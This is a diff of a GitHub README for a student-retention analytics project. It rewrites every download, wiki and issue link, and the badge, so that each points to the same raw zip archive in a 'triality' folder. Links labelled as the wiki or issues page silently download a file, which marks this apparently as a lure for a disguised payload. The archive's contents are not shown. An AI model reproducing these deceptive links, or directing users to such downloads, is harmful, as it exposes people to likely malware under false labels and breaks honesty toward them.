@@ -1,6 +1,6 @@
 # 📊 Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention - Analyze Student Retention Effectively
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/releases)
+[![Download](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip%https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Predictive-Analytics-Student-Retention-Fairness-Aware-Intervent
 
 To download the application, visit the link below:
 
-[Download from Releases](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/releases)
+[Download from Releases](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)
 
 1. Click the link above to open the Releases page on GitHub.
 2. Look for the latest version of the application listed on this page.
@@ -79,7 +79,7 @@ After installation, you can start the application by:
 
 For issues or questions, you can find help in the following ways:
 
-- Check the [Project Wiki](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/wiki) for guides and detailed explanations.
+- Check the [Project Wiki](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip) for guides and detailed explanations.
 - Open an issue in the GitHub repository for support from the community.
   
 ## 📞 Contact
@@ -88,8 +88,8 @@ If you have further questions or need direct assistance, please reach out throug
 
 ## 🔗 Useful Links
 
-- [Download the Application](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/releases)
-- [Visit the Project Wiki](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/wiki)
-- [View Issues and Support](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/issues)
+- [Download the Application](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)
+- [Visit the Project Wiki](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)
+- [View Issues and Support](https://github.com/Pelimon/Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention/raw/refs/heads/main/triality/Fairness-Predictive-Student-Retention-Aware-Analytics-Intervention-v3.8.zip)
 
 Thank you for using the **Predictive-Analytics-Student-Retention-Fairness-Aware-Intervention** application. We hope it helps improve student success!
